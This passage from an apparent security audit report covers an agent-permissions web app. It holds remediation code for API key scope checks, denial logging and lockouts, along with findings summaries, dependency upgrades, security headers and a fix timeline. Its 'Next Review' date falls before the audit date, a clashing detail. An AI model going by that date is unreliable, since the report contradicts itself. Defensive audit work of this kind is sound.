      .select({
        scopes: apiKeys.scopes,
        isActive: apiKeys.isActive,
      })
      .from(apiKeys)
      .where(eq(apiKeys.id, apiKeyId))
      .limit(1);

    // SECURITY: Generic error message (don't reveal key state)
    if (!apiKeyRecord || !apiKeyRecord.isActive) {
      // Log detailed info server-side only
      console.warn('[Security] API key validation failed', {
        apiKeyId,
        exists: !!apiKeyRecord,
        isActive: apiKeyRecord?.isActive,
        timestamp: new Date().toISOString(),
        userId,
      });

      return {
        allowed: false,
        reason: "Authentication failed", // Generic message
        permissionLevel,
        toolCategory,
      };
    }

    const scopes = apiKeyRecord.scopes as string[];
    const requiredScope = `agent:execute:${toolCategory}`;
    const hasScope =
      scopes.includes(requiredScope) ||
      scopes.includes("agent:execute:*") ||
      scopes.includes("*");

    if (!hasScope) {
      // SECURITY: Don't reveal which scopes exist
      console.warn('[Security] API key missing required scope', {
        apiKeyId,
        requiredScope,
        actualScopes: scopes,
        timestamp: new Date().toISOString(),
      });

      return {
        allowed: false,
        reason: "Insufficient permissions", // Don't mention scopes
        permissionLevel,
        toolCategory,
      };
    }
  }

  // ... rest of permission checks

  // Log all permission denials for security monitoring
  if (!result.allowed) {
    await this.logPermissionDenial({
      userId,
      toolName,
      toolCategory,
      permissionLevel,
      reason: result.reason,
      apiKeyId,
    });
  }

  return result;
}

private async logPermissionDenial(data: {
  userId: number;
  toolName: string;
  toolCategory: string;
  permissionLevel: AgentPermissionLevel;
  reason: string;
  apiKeyId?: number;
}): Promise<void> {
  const db = await getDb();
  if (!db) return;

  try {
    await db.insert(permissionDenialLogs).values({
      userId: data.userId,
      toolName: data.toolName,
      toolCategory: data.toolCategory,
      permissionLevel: data.permissionLevel,
      reason: data.reason,
      apiKeyId: data.apiKeyId,
      timestamp: new Date(),
    });

    // Check for suspicious activity patterns
    await this.checkForAttackPatterns(data.userId);
  } catch (error) {
    console.error('[Security] Failed to log permission denial:', error);
  }
}

private async checkForAttackPatterns(userId: number): Promise<void> {
  const db = await getDb();
  if (!db) return;

  // Check for repeated denials in short time
  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);

  const [result] = await db
    .select({ count: sql<number>`count(*)` })
    .from(permissionDenialLogs)
    .where(
      and(
        eq(permissionDenialLogs.userId, userId),
        gte(permissionDenialLogs.timestamp, fiveMinutesAgo)
      )
    );

  const denialCount = Number(result?.count || 0);

  if (denialCount > 10) {
    // Alert security team
    await this.sendSecurityAlert({
      type: 'REPEATED_PERMISSION_DENIALS',
      userId,
      count: denialCount,
      timeWindow: '5 minutes',
      timestamp: new Date(),
    });

    // Consider temporary lockout
    await this.temporarilyLockUser(userId, 15 * 60 * 1000); // 15 minute lockout
  }
}
```

---

### 10-15. MEDIUM/LOW Issues

Due to length constraints, I'll summarize the remaining medium and low severity findings:

**10. MEDIUM** - Insufficient Logging of Permission Decisions (agentPermissions.service.ts)
- Add comprehensive audit logging for all permission checks
- Track failed authorization attempts
- Implement alerting for suspicious patterns

**11. MEDIUM** - No CSRF Protection on Mutations (blog.ts)
- Add CSRF token validation to state-changing operations
- Set SameSite cookie attribute
- Implement double-submit cookie pattern

**12. MEDIUM** - Missing Tenant Isolation Verification (tenantIsolation.service.ts)
- Make requireTenantOwnership the default
- Add audit logging for isolation violations
- Throw exceptions instead of silent failures

**13. MEDIUM** - Unvalidated Redirect in Notion API (notion-blog.service.ts)
- Validate image URLs from Notion external files
- Whitelist allowed image domains
- Reject javascript: and data: URLs

**14. LOW** - Information Disclosure in Error Messages (audit.ts:543-549)
- Hide detailed errors in production
- Log full errors server-side only
- Return generic error messages to clients

**15. LOW** - No Content-Type Validation (audit.ts:520-535)
- Add X-Content-Type-Options: nosniff
- Sanitize filenames
- Add Cache-Control and X-Frame-Options headers

---

## Dependency Vulnerabilities

**High Priority:**
```bash
npm audit
```

Found:
- **@langchain/core** - HIGH (CVSS 8.6) - Serialization injection
- **@vercel/node** - HIGH - Multiple dependency issues
- **drizzle-kit** - MODERATE - esbuild-related

**Fix:**
```bash
npm install @langchain/core@latest
npm install drizzle-kit@latest
npm audit fix --force
```

---

## Security Headers (Missing)

Add to all HTTP responses:

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// Additional headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  next();
});
```

---

## Remediation Timeline

**Immediate (24 hours):**
1. Fix audit endpoint authentication (#1)
2. Add authorization to cache clearing (#2)
3. Move Notion key to secret manager (#3)

**High Priority (1 week):**
4. Add date validation (#4)
5. Implement HTML/CSV escaping (#5)
6. Add rate limiting to blog (#6)
7. Fix memory allocation DoS (#7)
8. Validate namespace inputs (#8)

**Medium Priority (2 weeks):**
9-13. Address information disclosure and logging gaps

**Low Priority (1 month):**
14-15. Content-Type validation and minor fixes

**Ongoing:**
- Update vulnerable dependencies
- Implement security monitoring
- Regular penetration testing

---

## Compliance Impact

### GDPR
- **VIOLATION**: Audit export without proper authentication exposes PII
- **REQUIREMENT**: Data processing agreements need secure export controls
- **FIX**: Implement proper authentication + audit logging

### SOC 2
- **VIOLATION**: Insufficient access logging on permission checks
- **REQUIREMENT**: Comprehensive audit trails for access control
- **FIX**: Implement detailed permission audit logging

### HIPAA (if applicable)
- **CONCERN**: No encryption-at-rest for tenant memory
- **REQUIREMENT**: PHI must be encrypted at rest
- **FIX**: Implement encryption for memory storage

---

## Conclusion

**Current Risk Level:** HIGH (due to 3 critical issues)
**Post-Fix Risk Level:** LOW-MEDIUM
**Estimated Remediation:** 40 hours (1 week with dedicated resources)

The most critical issues are authentication-related and must be addressed immediately to prevent data breaches and compliance violations.

---

**Auditor:** Sage-Security
**Date:** 2025-12-28
**Next Review:** 2025-01-28 (monthly for critical systems)
